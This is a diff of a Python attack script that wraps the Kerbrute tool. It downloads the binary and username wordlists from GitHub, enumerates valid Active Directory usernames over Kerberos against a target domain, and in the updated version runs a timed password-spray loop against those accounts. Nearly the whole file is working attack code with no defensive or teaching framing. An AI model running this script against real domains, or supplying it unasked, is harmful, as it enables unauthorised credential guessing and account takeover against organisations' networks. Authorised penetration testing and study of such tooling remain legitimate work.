@@ -1,66 +1,116 @@
-#!/bin/python3 
+#!/bin/python3
 
-import sys
-from colorama import Fore, Back, Style 
-import subprocess 
-import os 
-
-
+import argparse
+import subprocess
+import os
+import re
+import time
+from colorama import Fore, Style
 
 # Define Banner
 def printBanner():
-	print (Fore.YELLOW + """
-  _____                 _                                                   
-  \_   \_ ____   _____ | | _____        /\ /\___ _ __ _ __  _   _ _ __ ___  
-   / /\/ '_ \ \ / / _ \| |/ / _ \_____ / //_/ _ \ '__| '_ \| | | | '_ ` _ \ 
+    print(Fore.YELLOW + """
+  _____                 _
+  \_   \_ ____   _____ | | _____        /\ /\___ _ __ _ __  _   _ _ __ ___
+   / /\/ '_ \ \ / / _ \| |/ / _ \_____ / //_/ _ \ '__| '_ \| | | | '_ ` _ \
 /\/ /_ | | | \ V / (_) |   <  __/_____/ __ \  __/ |  | | | | |_| | | | | | |
 \____/ |_| |_|\_/ \___/|_|\_\___|     \/  \/\___|_|  |_| |_|\__,_|_| |_| |_|
-	""")
-print(Style.RESET_ALL)
-
+    """)
+    print(Style.RESET_ALL)
 
 def downloadKerbrute():
-	print(Fore.GREEN + "Hold on tight! Downloading Kerbrute and Userlists\n")
-	print(Style.RESET_ALL)
-	kerbrute_url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64"
-	userlists = ["https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/john.smith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jjsmith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/johnsmith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/service-accounts.txt"]
-	os.system('wget ' + kerbrute_url)
-	os.system('chmod +x kerbrute_linux_amd64')
-	for x in userlists:
-		os.system('wget ' + x)
+    print(Fore.GREEN + "Checking for Kerbrute and Userlists...\n")
+    kerbrute_filename = 'kerbrute_linux_amd64'
+    kerbrute_url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/" + kerbrute_filename
+    userlists_urls = [
+        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/john.smith.txt",
+        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jjsmith.txt",
+        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/johnsmith.txt",
+        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt",
+        "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/service-accounts.txt"
+    ]
 
-def invokeKerbrute():
-#for each line in the file it will be used as a parameter for kerbrute 
-	os.system('for file in $(ls | grep txt); do echo $file >> file_list.txt; done')
-	print(Fore.GREEN + "Executing kerbrute username enumeration against: " + domain)
-	print(Style.RESET_ALL)
-	with open("file_list.txt") as file_in:
-    		lines = []
-    		for line in file_in:
-        		lines.append(line)
-	outputlist = ['a', 'b', 'c', 'd', 'e']
-	for l, o in zip(range(len(lines)), outputlist):
-		print("\nAttacking: " + domain + " using " + str(l))
-		os.system('./kerbrute_linux_amd64 userenum -d ' + domain + ' ' + l + " -o " + o + '.txt' )
+    if not os.path.exists(kerbrute_filename):
+        subprocess.run(['wget', kerbrute_url])
+        subprocess.run(['chmod', '+x', kerbrute_filename])
 
-def invokeFormat():
-	outputlist2 = ['a.txt', 'b.txt' , 'c.txt' , 'd.txt' , 'e.txt']
-	#for e in outputlist2:
-	os.system("""cat valid_users.txt | cut -d " " -f8 > valid_users2.txt""")
-	print(Fore.RED + "\nCheck userlist and remove faulty users!")
-	print(Style.RESET_ALL)
-	os.system("""cat valid_users2.txt |  cut -f1 -d "@" | tee userlist""")
-printBanner() 
-print(Style.RESET_ALL)
+    for url in userlists_urls:
+        filename = url.split('/')[-1]
+        if not os.path.exists(filename):
+            subprocess.run(['wget', url])
 
-#Arguments
-domain = sys.argv[1]
+def invokeKerbrute(domain, dc_ip=None):
+    print(Fore.GREEN + "Executing kerbrute username enumeration against: " + domain + "\n")
+    userlists = [file for file in os.listdir('.') if file.endswith('.txt')]
+    
+    with open('validated_users.txt', 'w') as validated_users_file:
+        for userlist in userlists:
+            print(Fore.BLUE + f"Using {userlist} to enumerate {domain}")
+            command = ['./kerbrute_linux_amd64', 'userenum', '-d', domain, userlist]
+            if dc_ip:
+                command.extend(['--dc', dc_ip])
 
-if len(sys.argv) != 2:
-    print("Please enter a valid domain to run the script")
-    print("Format: exploit.py domain.local")
-    sys.exit(5)
-	
-downloadKerbrute()
-invokeKerbrute()
-invokeFormat()
+            result = subprocess.run(command, capture_output=True, text=True)
+            valid_usernames = re.findall(r'\[\+\] VALID USERNAME:\s+([^\s]+)', result.stdout)
+
+            for username in valid_usernames:
+                validated_users_file.write(username + '\n')
+
+            if "Couldn't find any KDCs for realm" in result.stderr:
+                print(Fore.RED + f"Error: Couldn't find any KDCs for realm {domain}. Please specify a Domain Controller with --dc-ip.\n")
+                return
+
+def removeDuplicates():
+    with open('validated_users.txt', 'r') as file:
+        unique_usernames = set(file.readlines())
+
+    with open('validated_users.txt', 'w') as file:
+        file.writelines(unique_usernames)
+
+def passwordSpray(domain, passlist, dc_ip=None):
+    with open(passlist, 'r') as file:
+        passwords = file.readlines()
+
+    for password in passwords:
+        password = password.strip()
+        print(Fore.GREEN + f"Executing password spray with password: {password}")
+
+        command = ['./kerbrute_linux_amd64', 'passwordspray', '-d', domain, 'validated_users.txt', password]
+        if dc_ip:
+            command.extend(['--dc', dc_ip])
+
+        result = subprocess.run(command, capture_output=True, text=True)
+
+        if "Couldn't find any KDCs for realm" in result.stderr:
+            print(Fore.RED + f"Error: Couldn't find any KDCs for realm {domain}. Please specify a Domain Controller with --dc-ip.\n")
+            return
+
+        # Check for successful sprays
+        successful_sprays = re.findall(r'\[\+\] VALID LOGIN: ([^\s]+)', result.stdout)
+        for spray in successful_sprays:
+            print(Fore.GREEN + f"Successful spray: {spray}")
+
+        print(Fore.YELLOW + "Waiting for 2 hours before the next attempt...")
+        time.sleep(7200)  # Sleep for 2 hours (7200 seconds)
+
+def main():
+    parser = argparse.ArgumentParser(description='Kerbrute User Enumeration and Password Spray Script')
+    parser.add_argument('-d', '--domain', required=True, help='Domain to enumerate')
+    parser.add_argument('--dc-ip', help='IP address of the Domain Controller')
+    parser.add_argument('--spray', action='store_true', help='Enable password spraying')
+    parser.add_argument('--passlist', help='Path to the password list for spraying')
+    args = parser.parse_args()
+
+    printBanner()
+    downloadKerbrute()
+    invokeKerbrute(args.domain, args.dc_ip)
+    removeDuplicates()
+
+    if args.spray:
+        if not args.passlist:
+            print(Fore.RED + "Password list is required for password spraying. Please specify with --passlist.")
+            return
+        passwordSpray(args.domain, args.passlist, args.dc_ip)
+
+if __name__ == '__main__':
+    main()
